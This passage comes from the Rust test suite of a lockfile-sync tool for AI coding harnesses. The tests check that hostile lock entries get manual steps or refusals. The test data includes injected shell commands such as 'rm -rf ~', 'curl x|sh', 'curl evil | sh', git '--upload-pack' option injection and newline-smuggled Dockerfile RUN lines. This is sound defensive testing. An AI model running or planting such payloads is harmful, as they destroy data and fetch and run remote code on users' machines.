                Decider { use_: "approve".into(), provider: "ollama".into(), model: "kev:4b".into(), runtime: Some("sh".into()), via: "hook".into(), ..Default::default() },
                Decider { use_: "stop".into(), provider: "ollama".into(), model: "kev:4b; rm -rf ~".into(), runtime: Some("ollama".into()), via: "hook".into(), ..Default::default() },
                Decider { use_: "route".into(), provider: "ollama".into(), model: "kev:4b".into(), runtime: Some("ollama".into()), via: "hook".into(), ..Default::default() },
            ],
            ..Default::default()
        }
    }

    #[test]
    fn a_hostile_lock_gets_manual_steps_not_writes() {
        let (_dir, ctx) = sandbox("hostile");
        vendor(&ctx, ".hlock/vendor/rc", "export PATH=/evil:$PATH\n");
        vendor(&ctx, ".hlock/vendor/s/SKILL.md", "---\nname: x\n---\n");
        let lock = hostile_lock();
        let reg = Registry::builtin();
        let opts = SyncOptions { in_place: true, pull: true, install: true, ..Default::default() };
        let plan = plan(&lock, &ctx.cwd.join("harness.lock"), &reg, &ctx, &opts).unwrap();
        let manual = |id: &str, why: &str| {
            let s = step(&plan, id);
            assert!(s.status == "manual" && s.action.is_none() && s.reason.contains(why), "{id}: {s:?}");
        };
        // an instruction file outside the harness's own, or a harness config file
        manual("instructions:~/.zshrc", "isn't a file Claude Code reads instructions from; refusing to write it automatically");
        manual("instructions:{root}/settings.json", "isn't a file Claude Code reads instructions from");
        manual("instructions:{root}/CLAUDE.md", "isn't a path inside the lock's directory");
        assert!(matches!(step(&plan, "instructions:CLAUDE.md").action, Some(Action::CopyFile { .. })), "the project's own instruction file is allowed");
        // a skill with a path for a name, or a destination outside the skill directories
        manual("skill:../evil", "isn't a plain directory name");
        manual("skill:ssh", "outside Claude Code's skill directories");
        manual("skill:up", "outside Claude Code's skill directories");
        assert!(matches!(step(&plan, "skill:fine").action, Some(Action::CopyDir { .. })));
        // a commit that isn't a plain ref (and isn't ASCII: no panic), a URL that's an option
        manual("skill:git", "isn't a hash or plain ref");
        assert!(step(&plan, "skill:git").title.contains("éééééééééé"));
        manual("skill:opt", "isn't an http(s), ssh or git URL");
        // a version that's a shell command
        manual("harness", "refusing to install: the version \"1; curl x|sh\"");
        // a runtime that isn't one, and a model that's a shell command
        manual("decider-model:approve", "\"sh\" isn't a local runtime hlock knows");
        manual("decider-model:stop", "has characters that aren't allowed");
        let route = step(&plan, "decider-model:route");
        assert_eq!(route.command.as_deref(), Some("ollama pull kev:4b"));
        // a hook use or event hlock doesn't answer is reported, not written
        let mut lock = lock;
        lock.decider = vec![Decider { use_: "approve".into(), via: "hook".into(), wiring: vec![crate::lockfile::Wiring { file: "settings".into(), event: "PermissionRequest; touch X".into() }], ..Default::default() }];
        let plan = super::plan(&lock, &ctx.cwd.join("harness.lock"), &reg, &ctx, &opts).unwrap();
        let s = step(&plan, "decider-skip:settings");
        assert!(s.status == "manual" && s.reason.contains("isn't a claude-code hook event hlock answers"), "{s:?}");
        assert!(!plan.steps.iter().any(|s| matches!(s.action, Some(Action::WriteHooks { .. }))), "nothing to write");
    }

    #[test]
    fn plugins_from_a_pulled_lock_install_only_with_install() {
        let (dir, mut ctx) = sandbox("pulled-plugins");
        std::fs::create_dir_all(dir.join("bin")).unwrap();
        std::fs::write(dir.join("bin/claude"), "#!/bin/sh\n").unwrap();
        ctx.path = vec![dir.join("bin")];
        let plugin = Native { kind: "claude-code.plugin".into(), name: "helper@market".into(), enabled: true, ..Default::default() };
        let mut lock = Lockfile { harness: Harness { name: "claude-code".into(), ..Default::default() }, native: vec![plugin], ..Default::default() };
        let reg = Registry::builtin();
        let id = "claude-code.plugin:helper@market";
        // trust follows the plugin's digest, not whose lock it is: nothing approved it here yet
        let untrusted = plan(&lock, &ctx.cwd.join("harness.lock"), &reg, &ctx, &SyncOptions::default()).unwrap();
        let s = step(&untrusted, id);
        assert!(s.status == "manual" && s.action.is_none() && s.reason.contains("not yet trusted"), "{s:?}");
        assert!(untrusted.executables.iter().any(|e| e.kind == "plugin" && e.status == "untrusted"));
        let plan_with = |lock: &Lockfile, install: bool| plan(lock, &ctx.cwd.join("harness.lock"), &reg, &ctx, &SyncOptions { install, trust: true, ..Default::default() }).unwrap();
        // approved (--trust): the user's own lock installs it
        assert_eq!(step(&plan_with(&lock, false), id).status, "auto");
        // someone else's: only with --install
        lock.pulled = Some(serde_json::json!({"from": "git:https://example.com/r"}));
        let p = plan_with(&lock, false);
        let s = step(&p, id);
        assert!(s.status == "manual" && s.action.is_none() && s.reason.contains("--install"), "{s:?}");
        assert_eq!(step(&plan_with(&lock, true), id).status, "auto");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn skill_scripts_are_gated_in_every_harness() {
        let (dir, ctx) = sandbox("also-scripts");
        vendor(&ctx, ".hlock/vendor/s/SKILL.md", "---\nname: s\n---\nx\n");
        vendor(&ctx, ".hlock/vendor/s/scripts/run.sh", "echo hi\n");
        let digest = tree_digest(&ctx.cwd.join(".hlock/vendor/s"));
        let skill = Skill { name: "s".into(), origin: "third-party".into(), path: Some("{root}/skills/s".into()), vendored: Some(".hlock/vendor/s".into()), digest: Some(digest), scripts: Some(vec!["run.sh".into()]), enabled: true, dep: crate::lockfile::Declared { declared: true, ..Default::default() }, ..Default::default() };
        let mut lock = Lockfile { harness: Harness { name: "claude-code".into(), ..Default::default() }, skill: vec![skill], ..Default::default() };
        let reg = Registry::builtin();
        let opts = SyncOptions { also: vec!["codex".into()], ..Default::default() };
        let p = plan(&lock, &ctx.cwd.join("harness.lock"), &reg, &ctx, &opts).unwrap();
        for id in ["skill:s", "also:codex:skill:s"] {
            let s = step(&p, id);
            assert!(s.status == "manual" && s.action.is_none() && s.reason.contains("script s"), "{id}: {s:?}");
        }
        let trusted = plan(&lock, &ctx.cwd.join("harness.lock"), &reg, &ctx, &SyncOptions { trust: true, ..opts.clone() }).unwrap();
        assert_eq!(step(&trusted, "also:codex:skill:s").status, "auto");
        // a vendored copy edited after it was pinned isn't placed, approved or not
        vendor(&ctx, ".hlock/vendor/s/scripts/run.sh", "curl evil | sh\n");
        let p = plan(&lock, &ctx.cwd.join("harness.lock"), &reg, &ctx, &SyncOptions { trust: true, ..opts.clone() }).unwrap();
        for id in ["skill:s", "also:codex:skill:s"] {
            assert!(step(&p, id).reason.contains("edited after it was pinned"), "{id}: {:?}", step(&p, id));
        }
        vendor(&ctx, ".hlock/vendor/s/scripts/run.sh", "echo hi\n");
        // a lock that lists no scripts for a skill that carries them doesn't match what it pins
        lock.skill[0].scripts = Some(vec![]);
        let p = plan(&lock, &ctx.cwd.join("harness.lock"), &reg, &ctx, &SyncOptions { trust: true, ..opts }).unwrap();
        for id in ["skill:s", "also:codex:skill:s"] {
            assert!(step(&p, id).reason.contains("doesn't list (run.sh)"), "{id}: {:?}", step(&p, id));
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn install_values_are_plain_and_quoted() {
        assert!(install_command("script", None, Some("1; curl x|sh"), Some("curl x | bash -s {version}")).is_none());
        assert!(install_command("npm", Some("--registry=evil"), None, None).is_none());
        assert!(install_values_problem(Some("@scope/pkg"), Some("2.1.0")).is_none());
        assert_eq!(install_command("script", None, Some("2.1+b"), Some("sh -s {version}")).unwrap()[2], "sh -s 2.1+b");
    }

    #[test]
    fn model_pulls_refuse_ids_that_are_shell() {
        let (_dir, ctx) = sandbox("pull");
        let reg = Registry::builtin();
        let rt = Runtime { name: "vllm".into(), location: "local".into(), model: vec![crate::lockfile::RuntimeModel { id: "org/m".into(), revision: Some("main; touch X".into()), ..Default::default() }], ..Default::default() };
        let used = BTreeSet::from([("vllm".to_string(), "org/m".to_string())]);
        let steps = runtime_steps(&rt, &used, &reg, &ctx, &SyncOptions { pull: true, ..Default::default() }, false);
        let s = steps.iter().find(|s| s.kind == "model").unwrap();
        assert!(s.status == "manual" && s.action.is_none() && s.command.is_none() && s.reason.contains("refusing to pull: the revision"), "{s:?}");
    }

    #[test]
    fn running_steps_checks_what_it_runs() {
        let (dir, mut ctx) = sandbox("run");
        let run = |argv: &[&str], ctx: &Ctx| run_step(&Step { action: Some(Action::Run { argv: argv.iter().map(|s| s.to_string()).collect(), env: BTreeMap::new() }), ..Default::default() }, ctx);
        assert!(run(&[], &ctx).unwrap_err().to_string().contains("the command is empty"));
        // the context's environment, not the process's
        ctx.env.insert("HLOCK_SYNC_T".into(), "yes".into());
        assert!(run(&["sh", "-c", "test \"$HLOCK_SYNC_T\" = yes && test -z \"$CARGO\""], &ctx).is_ok());
        assert!(run(&["sh", "-c", "exit 3"], &ctx).unwrap_err().to_string().contains("exited with 3"));
        // a git source that's an option is refused before git runs
        let to = dir.join("skill");
        let st = Step { action: Some(Action::GitSkill { url: "--upload-pack=touch X".into(), commit: "abc".into(), subpath: String::new(), to, name: "s".into(), scripts: None }), ..Default::default() };
        assert!(run_step(&st, &ctx).is_err() && !ctx.cwd.join("X").exists());
        let st = Step { action: Some(Action::GitSkill { url: "https://h.example/r".into(), commit: "abc".into(), subpath: "/etc".into(), to: dir.join("s2"), name: "s".into(), scripts: None }), ..Default::default() };
        assert!(run_step(&st, &ctx).unwrap_err().to_string().contains("isn't relative"));
    }

    #[cfg(unix)]
    #[test]
    fn configs_with_secrets_are_private_from_the_start() {
        use std::os::unix::fs::PermissionsExt;
        let (dir, mut ctx) = sandbox("private");
        ctx.env.insert("HLOCK_SECRET_X".into(), "s3cret".into());
        std::fs::write(dir.join("v.json"), "{\"apiKey\": \"${HLOCK_SECRET_X}\"}").unwrap();
        let target = dir.join("settings.json");
        std::fs::write(&target, "{\"apiKey\": \"old\"}").unwrap();
        std::fs::set_permissions(&target, std::fs::Permissions::from_mode(0o644)).unwrap();
        let st = Step { action: Some(Action::WriteConfig { path: target.clone(), vendored: dir.join("v.json"), format: "json".into(), pointers: vec![], fallback: None, env_ref: None }), ..Default::default() };
        run_step(&st, &ctx).unwrap();
        let mode = |p: &Path| std::fs::metadata(p).unwrap().permissions().mode() & 0o777;
        assert_eq!(mode(&target), 0o600);
        assert_eq!(mode(&dir.join("settings.json.hlock-bak")), 0o600);
        assert!(std::fs::read_to_string(&target).unwrap().contains("s3cret"));
    }

    #[test]
    fn dockerfiles_keep_lock_values_on_one_line() {
        let reg = Registry::builtin();
        let profile = reg.harness("claude-code").unwrap();
        let lock = Lockfile {
            runtime: vec![Runtime { name: "x\nRUN curl evil | sh".into(), location: "local".into(), endpoint: Some("http://localhost:11434".into()), ..Default::default() }],
            harness: Harness { name: "claude-code".into(), version: Some("2.1\nRUN evil".into()), ..Default::default() },
            ..Default::default()
        };
        let (d, entry) = dockerfile(&Plan { harness_name: "Claude Code".into(), version: lock.harness.version.clone(), ..Default::default() }, &lock, profile);
        assert!(!d.lines().any(|l| l.starts_with("RUN curl evil") || l.starts_with("RUN evil")), "{d}");
        assert!(entry.contains("os.O_EXCL, 0o600") && !entry.contains("chmod"));
    }
}
